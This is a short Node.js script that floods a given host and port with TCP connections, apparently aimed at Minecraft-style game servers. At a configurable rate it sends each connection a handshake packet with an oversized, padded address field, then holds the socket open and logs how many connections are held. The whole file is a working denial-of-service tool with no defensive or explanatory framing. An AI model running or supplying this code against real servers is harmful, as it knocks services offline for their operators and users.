// mix.js <host> <port> <ratePerSec> [protocolVersion]
const net = require('net');
const HOST = process.argv[2];
const PORT = +process.argv[3];
const RATE = +(process.argv[4] || 120);
const PROTO = +(process.argv[5] || 774);

const varint = n => {
  const o = []; n >>>= 0;
  do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; o.push(b); } while (n);
  return Buffer.from(o);
};
const frame = p => Buffer.concat([varint(p.length), p]);
const addr = Buffer.from(HOST + '.' + 'x'.repeat(180));
const port = Buffer.alloc(2);
port.writeUInt16BE(PORT);
const HS = frame(Buffer.concat([
  varint(0), varint(PROTO), varint(addr.length), addr, port, varint(1)
]));

let held = 0, errs = 0;

function hold() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false, counted = false;
  const next = () => { if (done) return; done = true; if (counted) { held--; counted = false; } s.destroy(); };
  s.setNoDelay(true);
  s.on('connect', () => { counted = true; held++; s.write(HS); });
  s.on('data', () => {});
  s.on('end', next);
  s.on('error', () => { errs++; next(); });
  s.setTimeout(12000, next);
}

setInterval(() => console.log(`held=${held} errs=${errs}`), 5000);
const perTick = Math.max(1, Math.round(RATE / 20));
setInterval(() => { for (let i = 0; i < perTick; i++) hold(); }, 50);